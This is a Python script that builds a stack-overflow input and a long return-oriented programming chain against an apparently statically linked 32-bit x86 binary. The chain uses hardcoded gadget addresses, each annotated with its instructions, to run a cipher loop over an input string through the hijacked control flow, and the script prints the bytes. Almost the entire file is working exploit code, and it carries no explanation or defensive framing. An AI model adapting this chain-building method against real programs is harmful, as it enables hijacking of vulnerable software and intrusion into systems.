Input_String="ABZY"

key=10





k_cval=chr(key+11)

in0=(Input_String+"\x0a")



in1=("\x41"*12 + "\x0a")

in2=("\x41"+"\x0a")*19

prev_ebp="\xdc"+"\x0a"+"\xd0"+"\x0a"+"\xff"+"\x0a"+"\xff"+"\x0a"



set_ecx_glb="\xc1"+"\x0a"+"\x40"+"\x0a"+"\x06"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x080640c1 : pop ecx ; add al, 0xf6 ; ret)

glb_add="\xc0"+"\x0a"+"\x6c"+"\x0a"+"\x0e"+"\x0a"+"\x08"+"\x0a"

set_eax_ciphadd="\x4a"+"\x0a"+"\x05"+"\x0a"+"\x0b"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x080b054a : pop eax ; ret)

init_ciph_add="\xe0"+"\x0a"+"\x6c"+"\x0a"+"\x0e"+"\x0a"+"\x08"+"\x0a"

set_glb_ciphadd="\x4d"+"\x0a"+"\x8b"+"\x0a"+"\x08"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08088b4d : mov dword ptr [ecx], eax ; pop ebx ; ret)

nop="\x0e"+"\x0a"+"\x90"+"\x0a"+"\x04"+"\x0a"+"\x08"+"\x0a"



set_edx="\xf9"+"\x0a"+"\xeb"+"\x0a"+"\x05"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x0805ebf9 : pop edx ; pop ebx ; ret)

val_0="\x00"+"\x0a"+"\x00"+"\x0a"+"\x00"+"\x0a"+"\x00"+"\x0a"

restore_ebx="\x00"+"\x0a"+"\x50"+"\x0a"+"\x0e"+"\x0a"+"\x08"+"\x0a"

set_eax_glb="\x4a"+"\x0a"+"\x05"+"\x0a"+"\x0b"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x080b054a : pop eax ; ret)

set_eax_ptreax="\x44"+"\x0a"+"\xfc"+"\x0a"+"\x05"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x0805fc44 : mov eax, dword ptr [eax] ; ret)

set_dh_ptreax="\x7c"+"\x0a"+"\x13"+"\x0a"+"\x07"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x0807137c : add dh, byte ptr [eax] ; ret)

set_ecx_0="\xc1"+"\x0a"+"\x40"+"\x0a"+"\x06"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x080640c1 : pop ecx ; add al, 0xf6 ; ret)

set_eax_7="\x60"+"\x0a"+"\x8d"+"\x0a"+"\x09"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08098d60 : mov eax, 7 ; ret)

inc_eax="\x9e"+"\x0a"+"\x8a"+"\x0a"+"\x08"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08088a9e : inc eax ; ret)

cmp_al_dh="\xf5"+"\x0a"+"\x0d"+"\x0a"+"\x07"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08070df5 : cmp al, dh ; pop edi ; ret)

edi_stck_addr="\x76"+"\x0a"+"\xcf"+"\x0a"+"\xff"+"\x0a"+"\xff"+"\x0a"

set_cl_cf="\xa4"+"\x0a"+"\x9c"+"\x0a"+"\x04"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08049ca4 : adc cl, cl ; ret)

addr_wbuf1="\x20"+"\x0a"+"\xd0"+"\x0a"+"\xff"+"\x0a"+"\xff"+"\x0a"

set_eax_8="\xd6"+"\x0a"+"\x19"+"\x0a"+"\x07"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x080719d6 : mov eax, 8 ; pop edi ; ret)

set_wordbuf1_eax="\x32"+"\x0a"+"\xf9"+"\x0a"+"\x05"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x0805f932 : mov dword ptr [edx], eax ; ret)

set_eax_ecx="\xb0"+"\x0a"+"\x8d"+"\x0a"+"\x09"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08098db0 : mov eax, ecx ; ret)

exch_edx_eax="\x96"+"\x0a"+"\x46"+"\x0a"+"\x07"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08074696 : xchg edx, eax ; ret)

set_ecx_wbuf1="\xc1"+"\x0a"+"\x40"+"\x0a"+"\x06"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x080640c1 : pop ecx ; add al, 0xf6 ; ret)

mult_eax_8="\xd8"+"\x0a"+"\xb2"+"\x0a"+"\x06"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x0806b2d8 : imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret)

set_wbuf1_eax_ebx_adwbuf1="\x4d"+"\x0a"+"\x8b"+"\x0a"+"\x08"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08088b4d : mov dword ptr [ecx], eax ; pop ebx ; ret)

set_eax_0="\x4a"+"\x0a"+"\x05"+"\x0a"+"\x0b"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x080b054a : pop eax ; ret)

add_esp_wbuf1val="\xc1"+"\x0a"+"\xc3"+"\x0a"+"\x09"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x0809c3c1 : add esp, dword ptr [ebx + eax*4] ; ret)

set_esp_rmain="\xfa"+"\x0a"+"\x04"+"\x0a"+"\x0b"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x080b04fa : pop esp ; ret)

addr_rmain="\xc0"+"\x0a"+"\xd1"+"\x0a"+"\xff"+"\x0a"+"\xff"+"\x0a"





edx_stck_addr="\xd4"+"\x0a"+"\xcf"+"\x0a"+"\xff"+"\x0a"+"\xff"+"\x0a"

set_eax_currciphadd="\x30"+"\x0a"+"\xf9"+"\x0a"+"\x05"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x0805f930 : mov eax, dword ptr [ecx] ; mov dword ptr [edx], eax ; ret)

set_ecx_eax="\xb8"+"\x0a"+"\x8d"+"\x0a"+"\x09"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08098db8 : mov ecx, eax ; mov eax, ecx ; ret)

set_eax_kp11="\x4a"+"\x0a"+"\x05"+"\x0a"+"\x0b"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x080b054a : pop eax ; ret)

val_kp11=k_cval+"\x0a"+"\x00"+"\x0a"+"\x00"+"\x0a"+"\x00"+"\x0a"

val_11="\x0b"+"\x0a"+"\x00"+"\x0a"+"\x00"+"\x0a"+"\x00"+"\x0a"

ebx_stck_addr="\xc4"+"\x0a"+"\x46"+"\x0a"+"\x27"+"\x0a"+"\x7c"+"\x0a"

sub_eax_edx="\x80"+"\x0a"+"\xf9"+"\x0a"+"\x05"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x0805f980 : sub eax, edx ; ret)

add_n_currciph="\xde"+"\x0a"+"\x4d"+"\x0a"+"\x05"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08054dde : add byte ptr [ecx], al ; ret)

set_eax_1="\x00"+"\x0a"+"\x8d"+"\x0a"+"\x09"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08098d00 : mov eax, 1 ; ret)

set_edi="\x6f"+"\x0a"+"\xb3"+"\x0a"+"\x04"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x0804b36f : pop edi ; ret)

set_eax_ciphval="\x47"+"\x0a"+"\xb3"+"\x0a"+"\x06"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x0806b347 : imul byte ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret)

set_dl_al="\x07"+"\x0a"+"\x73"+"\x0a"+"\x06"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08067307 : mov dl, al ; ret) 

set_bh_91="\x22"+"\x0a"+"\x90"+"\x0a"+"\x04"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08049022 : pop ebx ; ret)

valh_91="\x00"+"\x0a"+"\x5b"+"\x0a"+"\x00"+"\x0a"+"\x00"+"\x0a"

div_eax_ebx="\x7b"+"\x0a"+"\x0b"+"\x0a"+"\x09"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08090b7b : idiv bh ; dec dword ptr [edi] ; xchg ebp, eax ; ret)

set_ecx_wbuf2="\xc1"+"\x0a"+"\x40"+"\x0a"+"\x06"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x080640c1 : pop ecx ; add al, 0xf6 ; ret)

addr_wbuf2="\x24"+"\x0a"+"\xd0"+"\x0a"+"\xff"+"\x0a"+"\xff"+"\x0a"

xchg_ebp_eax="\xbe"+"\x0a"+"\x2a"+"\x0a"+"\x06"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08062abe : xchg ebp, eax ; ret)

mult_eax_26="\x47"+"\x0a"+"\xb3"+"\x0a"+"\x06"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x0806b347 : imul byte ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret)

set_edi_eax="\x31"+"\x0a"+"\x4d"+"\x0a"+"\x07"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08074d31 : mov edi, eax ; mov esi, edx ; mov eax, dword ptr [esp + 4] ; ret)

sub_edx_edi="\x6a"+"\x0a"+"\xc6"+"\x0a"+"\x05"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x0805c66a : sub edx, edi ; pop edi ; pop ebp ; mov eax, edx ; ret)

set_ciphval_eax="\xc2"+"\x0a"+"\xda"+"\x0a"+"\x06"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x0806dac2 : mov byte ptr [edx], al ; mov eax, edx ; ret)

inc_ciphadd="\x95"+"\x0a"+"\xce"+"\x0a"+"\x08"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x0808ce95 : inc dword ptr [ecx] ; ret)

set_esp_begin="\xfa"+"\x0a"+"\x04"+"\x0a"+"\x0b"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x080b04fa : pop esp ; ret)

addr_begin="\x64"+"\x0a"+"\xd0"+"\x0a"+"\xff"+"\x0a"+"\xff"+"\x0a"



set_glb_0="\x4d"+"\x0a"+"\x8b"+"\x0a"+"\x08"+"\x0a"+"\x08"+"\x0a" # Gadget: (0x08088b4d : mov dword ptr [ecx], eax ; pop ebx ; ret)

ret_main="\xba"+"\x0a"+"\x9e"+"\x0a"+"\x04"+"\x0a"+"\x08"+"\x0a"

ret_exit="\xf0"+"\x0a"+"\x07"+"\x0a"+"\x05"+"\x0a"+"\x08"+"\x0a"

fill_ecx="\xe0"+"\x0a"+"\xd1"+"\x0a"+"\xff"+"\x0a"+"\xff"+"\x0a"

exit_loop="\x00"+("\x41"*3)+("\x1a"+"\x00"+"\x00"+"\x00")+("\x41"*4)+("\x09"+"\x00"+"\x00"+"\x00")+"\x0a"



y=in0+in1+in2+prev_ebp+set_ecx_glb+glb_add+set_eax_ciphadd+init_ciph_add+set_glb_ciphadd+nop+set_edx+val_0+restore_ebx+set_eax_glb+glb_add+set_eax_ptreax+set_dh_ptreax+set_ecx_0+val_0+set_eax_7+inc_eax+inc_eax+inc_eax+cmp_al_dh+edi_stck_addr+set_cl_cf+set_edx+addr_wbuf1+restore_ebx+set_eax_8+edi_stck_addr+set_wordbuf1_eax+set_eax_ecx+exch_edx_eax+set_ecx_wbuf1+addr_wbuf1+exch_edx_eax+mult_eax_8+fill_ecx+set_wbuf1_eax_ebx_adwbuf1+addr_wbuf1+set_eax_0+val_0+add_esp_wbuf1val+set_esp_rmain+addr_rmain+set_ecx_glb+glb_add+set_edx+edx_stck_addr+nop+set_eax_currciphadd+set_ecx_eax+set_eax_kp11+val_kp11+set_edx+val_11+ebx_stck_addr+sub_eax_edx+add_n_currciph+set_eax_1+set_edi+edi_stck_addr+set_eax_ciphval+ebx_stck_addr+set_edx+val_0+ebx_stck_addr+set_dl_al+set_bh_91+valh_91+set_edi+edx_stck_addr+div_eax_ebx+set_ecx_wbuf2+addr_wbuf2+xchg_ebp_eax+set_edi+edi_stck_addr+mult_eax_26+restore_ebx+set_edi_eax+sub_edx_edi+edi_stck_addr+prev_ebp+set_ecx_eax+set_eax_glb+glb_add+set_eax_ptreax+exch_edx_eax+set_eax_ecx+set_ciphval_eax+set_ecx_glb+glb_add+inc_ciphadd+set_esp_begin+addr_begin+set_ecx_glb+glb_add+set_eax_0+val_0+set_glb_0+restore_ebx+ret_main+ret_exit+fill_ecx+restore_ebx+exit_loop



print(y)